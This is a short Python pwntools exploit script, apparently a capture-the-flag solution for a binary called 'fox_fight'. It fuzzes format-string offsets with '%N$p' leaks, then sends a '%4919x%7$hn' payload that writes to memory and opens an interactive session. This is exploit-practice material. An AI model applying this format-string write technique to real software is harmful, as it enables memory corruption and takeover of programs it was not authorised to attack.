#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./fox_fight', checksec=False)
context.log_level = 'error'
context.terminal = ['wt.exe', 'wsl', '-e', 'sh', '-c']

gdbscript = '''
    continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote('', 0)
    else:
        return process(elf.path)

def fuzzing():
    for i in range(1, 50):
        p = start()
        p.sendlineafter(b'> ', b'1')
        p.sendline('%{}$p'.format(i).encode())
        p.recvuntil(b'is: ')
        print(f'try {i} {p.recvline().strip()}')
        p.close()

#fuzzing()
p = start()

p.sendlineafter(b'> ', b'1')

payload = b'%4919x%7$hn'

p.sendlineafter(b': ', payload)
p.interactive()
